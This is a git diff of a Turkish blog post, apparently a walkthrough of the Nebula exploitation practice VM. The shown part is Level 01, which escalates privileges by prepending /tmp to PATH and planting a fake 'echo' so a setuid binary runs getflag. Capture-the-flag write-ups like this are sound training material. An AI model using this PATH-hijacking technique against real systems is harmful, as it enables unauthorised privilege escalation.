@@ -5,7 +5,7 @@ date: 2018-02-23
 comments: false
 ---
   Nebula, Linux Exploitation üzerine pratik yapma imkanı sunan zafiyetli bir sanal makinadır. Daha ayrıntılı bilgiye
-[ buradan ](https://exploit-exercises.com/nebula/) ulaşabilirsiniz.
+[buradan](https://exploit-exercises.com/nebula/) ulaşabilirsiniz.
 
 ### Level 00
 
@@ -82,18 +82,11 @@ Bazı argümanlarla birlikte programı çalıştırmayı denesekte, bu yolla bir
 > `PATH değişkeni`, sistemin çalıştırılabilir dosyaları bulmak için nerelere bakması gerektiğini tanımlar.
 
 Yani bizde PATH değişkenine yeni bir dizin eklesek,eklediğimiz dizinin PATH değişkeninde ki sırası önemli, ve çalıştırmak istediğimiz dosyayı o dizine echo ismiyle kaydetsek, env komutu ilk bizim echo programımız ile karşılaşacağı için onu çalıştıracaktır.
-
-PATH değişkenine yeni bir dizin ekliyoruz.
 {% raw %}
     level01@nebula:/home/flag01$ PATH=/tmp:$PATH
     level01@nebula:/home/flag01$ echo $PATH
     /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
-{% endraw %}
-Çalıştırmak istediğimiz dosyayı /tmp altına echo ismiyle kaydediyoruz.
-{% raw %}
     level01@nebula:/home/flag01$ cp /bin/getflag /tmp/echo
-{% endraw %}
-{% raw %}
     level01@nebula:/home/flag01$ ./flag01
     You have successfully executed getflag on a target account
 {% endraw %}
